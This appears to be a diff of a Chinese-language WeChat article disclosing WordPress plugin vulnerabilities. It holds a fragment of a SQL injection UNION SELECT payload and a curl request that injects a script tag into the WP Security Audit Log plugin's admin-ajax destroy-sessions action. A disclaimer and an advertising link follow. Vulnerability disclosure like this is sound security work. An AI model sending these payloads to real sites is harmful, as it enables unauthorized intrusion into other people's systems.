@@ -47,8 +47,8 @@ date=2024-11-06%' UNION ALL SELECT 11,CHAR(113)CHAR(75,101,86,69,115,83,113,89,1
 **WP Security Audit Log 插件检测 一个允许注入恶意脚本的 XSS 漏洞。.**
 
 ```
-curl -X POST 'http://example.com/wp-admin/admin-ajax.php' \
-     -d 'action=destroy-sessions&user_id=<script>alert("XSS found windz3r0day")</script>'
+curl -X POST 'http://example.com/wp-admin/admin-ajax.php' \
+     -d 'action=destroy-sessions&user_id=<script>alert("XSS found windz3r0day")</script>'
 
 
 ```
@@ -120,7 +120,7 @@ Priority: u=0, i
 
 仅用于教育目的。在未获得明确许可的情况下对系统或网站使用这些漏洞是非法的。作者对任何使用这些信息所产生的后果不负责任。
 
-![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/2_02.png) 广告
+![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/2_02.png) 广告
 ------------------------------------------------------------------------------------
 
 全网最强大的网络安全资源大全：[棉花糖会员站介绍 (24 年 10 月 4 日版本)](http://mp.weixin.qq.com/s?__biz=MzkyOTQzNjIwNw==&mid=2247489356&idx=1&sn=b748fb12a8220965758983ddc05baaad&chksm=c208d00cf57f591aaca9a8c2a8507f9ec6fa07457598007a61c93e425b5248bc5a4d0e8b6e70&scene=21#wechat_redirect)
